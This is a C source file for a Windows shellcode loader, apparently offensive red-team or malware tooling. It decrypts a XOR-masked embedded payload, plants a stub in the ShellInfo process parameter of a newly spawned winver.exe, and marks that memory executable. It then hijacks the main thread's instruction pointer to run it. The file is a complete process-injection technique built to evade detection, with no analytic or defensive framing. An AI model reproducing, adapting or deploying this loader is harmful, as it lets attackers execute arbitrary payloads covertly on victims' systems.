#include <windows.h>
#include <stdint.h>

#include "native.h"

#include "tcg.h"
#include "dfr.h"
#include "utils.h"
#include "shellwriter.h"

char __SC__ [ 0 ] __attribute__ ( ( section ( "sc" ) ) );
char __MASK__   [ 0 ] __attribute__ ( ( section ( "mask"  ) ) );


void go() {

    dprintf("[+] Loader running (go)...\n");

  
    RESOURCE * masked_sc = ( RESOURCE * ) GETRESOURCE ( __SC__ );
    RESOURCE * mask_key   = ( RESOURCE * ) GETRESOURCE ( __MASK__ );

    dprintf("[+] Read resource masked SCDATA size: %d\n", masked_sc->length);
    dprintf("[+] Read resource masked SCDATA value addr: %p\n", masked_sc->value);


    char unmasked_sc[masked_sc->length];
    for ( int i = 0; i < masked_sc->length; i++ ) {
        unmasked_sc [ i ] = masked_sc->value [ i ] ^ mask_key->value [ i % mask_key->length ];
    }

    u8 stub[SCW_BUF_LARGE];
    int _i; for (_i = 0; _i < SCW_BUF_LARGE; _i++) stub[_i] = 0;
    SCW w;
    scw_init(&w, stub, sizeof(stub));
    scw_load_and_call(&w,
        (u64)KERNEL32$VirtualAlloc,
        (u64)KERNEL32$VirtualProtect,
        (const u8 *)unmasked_sc, masked_sc->length);


    dprintf("[+] ShellWriter stub: %d bytes, nulls: %s\n",
        w.len, scw_check_nulls(&w) == -1 ? "none" : "BUG");


    wchar_t ntPath[] = {
        L'\\',L'?',L'?',L'\\',
        L'C',L':',L'\\',
        L'W',L'i',L'n',L'd',L'o',L'w',L's',L'\\',
        L'S',L'y',L's',L't',L'e',L'm',L'3',L'2',L'\\',
        L'w',L'i',L'n',L'v',L'e',L'r',L'.',L'e',L'x',L'e',
        L'\0'
    };

    UNICODE_STRING imagePath;
    imagePath.Buffer       = ntPath;
    imagePath.Length       = (USHORT)(sizeof(ntPath) - sizeof(wchar_t));
    imagePath.MaximumLength = sizeof(ntPath);

    // ShellInfo as UNICODE_STRING with explicit Length
    // Null bytes in stub are fine — no null-termination scan here
    UNICODE_STRING shellInfoStr;
    shellInfoStr.Buffer        = (PWSTR)stub;
    shellInfoStr.Length        = (USHORT)w.len;
    shellInfoStr.MaximumLength = (USHORT)sizeof(stub);

    PRTL_USER_PROCESS_PARAMETERS procParams = NULL;
    NTSTATUS status = 0;

    status = NTDLL$RtlCreateProcessParametersEx(
        &procParams,
        &imagePath,   // ImagePathName
        NULL,         // DllPath
        NULL,         // CurrentDirectory
        NULL,         // CommandLine
        NULL,         // Environment
        NULL,         // WindowTitle
        NULL,         // DesktopInfo
        &shellInfoStr,// ShellInfo ← stub goes here
        NULL,         // RuntimeData
        RTL_USER_PROCESS_PARAMETERS_NORMALIZED);

    if (!NT_SUCCESS(status)) {
        dprintf("[-] RtlCreateProcessParametersEx failed: 0x%X\n", status);
        return;
    }

    PS_CREATE_INFO createInfo = {0};
    createInfo.Size = sizeof(PS_CREATE_INFO);

    PS_ATTRIBUTE_LIST attrList = {0};
    attrList.TotalLength              = sizeof(PS_ATTRIBUTE_LIST);
    attrList.Attributes[0].Attribute  = PS_ATTRIBUTE_IMAGE_NAME;
    attrList.Attributes[0].Size       = imagePath.Length;
    attrList.Attributes[0].ValuePtr   = imagePath.Buffer;
    attrList.Attributes[0].ReturnLength = NULL;

    HANDLE hProcess = NULL, hThread = NULL;

    dprintf("[+] Calling NtCreateUserProcess...\n");
    status = NTDLL$NtCreateUserProcess(
        &hProcess,
        &hThread,
        PROCESS_ALL_ACCESS,
        THREAD_ALL_ACCESS,
        NULL, NULL,
        0,                                   // ProcessFlags
        0, 
        procParams,
        &createInfo,
        &attrList);


    LARGE_INTEGER delay;
    delay.QuadPart = -2000000LL;  // 200ms
    NTDLL$NtDelayExecution(FALSE, &delay);


    NTDLL$RtlDestroyProcessParameters(procParams);

    if (!NT_SUCCESS(status)) {
        dprintf("[-] NtCreateUserProcess failed: 0x%X\n", status);
        return;
    }

    PROCESS_BASIC_INFORMATION pbi = {0};
    DWORD retLen    = 0;
    SIZE_T bytesRead = 0;

    NTDLL$NtQueryInformationProcess(hProcess, 0, &pbi, sizeof(pbi), &retLen);
    dprintf("[+] Process created PID: %llu\n", pbi.UniqueProcessId);

    PEB pebLocal = {0};
    status = NTDLL$NtReadVirtualMemory(hProcess, pbi.PebBaseAddress,
                                        &pebLocal, sizeof(pebLocal), &bytesRead);
    if (!NT_SUCCESS(status)) {
        dprintf("[-] NtReadVirtualMemory (PEB) failed\n");
        return;
    }

    RTL_USER_PROCESS_PARAMETERS parameters = {0};
    status = NTDLL$NtReadVirtualMemory(hProcess, pebLocal.ProcessParameters,
                                        &parameters, sizeof(parameters), &bytesRead);
    if (!NT_SUCCESS(status)) {
        dprintf("[-] NtReadVirtualMemory (PROCPARAMS) failed\n");
        return;
    }

    PVOID     shellcode     = (PVOID)parameters.ShellInfo.Buffer;
    ULONG_PTR unaligned     = (ULONG_PTR)shellcode;
    ULONG_PTR aligned       = unaligned & ~(4096 - 1);
    PVOID     base          = (PVOID)aligned;
    SIZE_T    shellcodeSize = (SIZE_T)w.len + (unaligned - aligned);
    ULONG     oldp          = 0;

    status = NTDLL$NtProtectVirtualMemory(hProcess, &base,
                                           &shellcodeSize, PAGE_EXECUTE_READ, &oldp);
    if (!NT_SUCCESS(status)) {
        dprintf("[-] NtProtectVirtualMemory failed\n");
        return;
    }

    CONTEXT ctx __attribute__((aligned(16))) = {0};
    ctx.ContextFlags = CONTEXT_CONTROL;

    status = NTDLL$NtGetContextThread(hThread, &ctx);
    if (!NT_SUCCESS(status)) {
        dprintf("[-] NtGetContextThread failed\n");
        return;
    }

    ctx.Rip = (DWORD64)shellcode;

    status = NTDLL$NtSetContextThread(hThread, &ctx);
    if (!NT_SUCCESS(status)) {
        dprintf("[-] NtSetContextThread failed\n");
        return;
    }

    dprintf("[+] RIP hijacked, resuming thread...\n");


    LARGE_INTEGER wait_timeout;
    wait_timeout.QuadPart = -10000000LL;  // 1 second
    NTDLL$NtWaitForSingleObject(hThread, FALSE, &wait_timeout);

    NTDLL$NtClose(hThread);
    NTDLL$NtClose(hProcess);

    dprintf("[+] === EXIT LOADER ===\n");
   
   
}

